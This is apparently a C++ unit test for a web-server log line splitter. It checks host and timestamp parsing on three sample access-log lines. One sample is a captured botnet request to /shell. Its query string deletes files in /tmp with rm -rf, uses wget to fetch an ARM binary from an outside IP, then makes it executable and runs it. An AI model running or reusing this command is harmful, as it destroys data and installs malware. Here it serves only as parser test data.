/*=============================================================================
  Copyright (C) 2020 yumetodo <yume-wikijp@live.jp>
  Distributed under the Boost Software License, Version 1.0.
  (See https://www.boost.org/LICENSE_1_0.txt)
=============================================================================*/
#include "../include/line_splitter.hpp"
#include "../iutest/include/iutest.hpp"
#include <utility>
IUTEST(LineSplitter, LineSplitter)
{
    constexpr std::pair<const char*, raw_parsed_line> input[] = {
        {
            R"(192.35.168.144 - - [30/Jun/2020:11:30:43 +0900] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 zgrab/0.x")",
            {
                "192.35.168.144",
                "30/Jun/2020:11:30:43 +0900",
            },
        },
        {
            R"(127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326)",
            {
                "127.0.0.1",
                "10/Oct/2000:13:55:36 -0700",
            }
        },
        {
            R"(47.74.1.66 - - [30/Jun/2020:10:34:48 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.95.168.228/YaO2uFOvUG8LV1y5NY1aCHmr1WdBLjcjiVD6aRRAWDL6oNY29J88y0nrXxaHBmTLEYC9yB56gBn95pco8kCbldVsHmjNQk8JTaC/Meth.arm7;chmod+777+/tmp/Meth.arm7;sh+/tmp/Meth.arm7+Selfrep.Jaws HTTP/1.1" 404 492 "-" "Hello, world")",
            {
                "47.74.1.66",
                "30/Jun/2020:10:34:48 +0900",
            }
        },
    };
    for(auto&& [i, expected] : input) {
        auto re = line_splitter(i);
        IUTEST_ASSERT_EQ(expected.host, re.host);
        IUTEST_ASSERT_EQ(expected.time, re.time);
    }
}